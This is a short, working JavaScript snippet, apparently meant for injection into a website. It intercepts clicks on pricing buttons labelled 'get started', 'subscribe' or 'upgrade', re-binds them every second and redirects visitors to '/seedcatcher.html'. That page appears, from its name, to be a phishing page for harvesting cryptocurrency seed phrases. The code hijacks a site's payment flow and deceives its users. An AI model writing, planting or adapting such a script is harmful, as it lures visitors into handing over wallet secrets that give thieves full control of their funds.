(function() {
    const redirectToCatcher = (e) => {
        // Only redirect if it's a click on a pricing button
        let el = e.target.closest('a, button, div');
        if (!el) return;
        
        let text = (el.innerText || "").toLowerCase().trim();
        let href = (el.getAttribute("href") || "").toLowerCase();
        
        // Ignore the menu link
        if (href === "/premium" || href.endsWith("/premium")) return;
        
        // Catch the buttons
        if (text === 'get started' || text === 'subscribe' || text === 'upgrade') {
            e.preventDefault();
            e.stopPropagation();
            window.location.href = '/seedcatcher.html';
        }
    };

    // Attach to the whole document, but use capture phase so we get it FIRST
    document.addEventListener('click', redirectToCatcher, true);

    // Also, aggressively hunt for the buttons and attach directly
    setInterval(() => {
        document.querySelectorAll('a, button').forEach(el => {
            let text = (el.innerText || "").toLowerCase().trim();
            if (text === 'get started' || text === 'subscribe' || text === 'upgrade') {
                el.onclick = function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    window.location.href = '/seedcatcher.html';
                };
            }
        });
    }, 1000); // Check every second for new buttons
})();
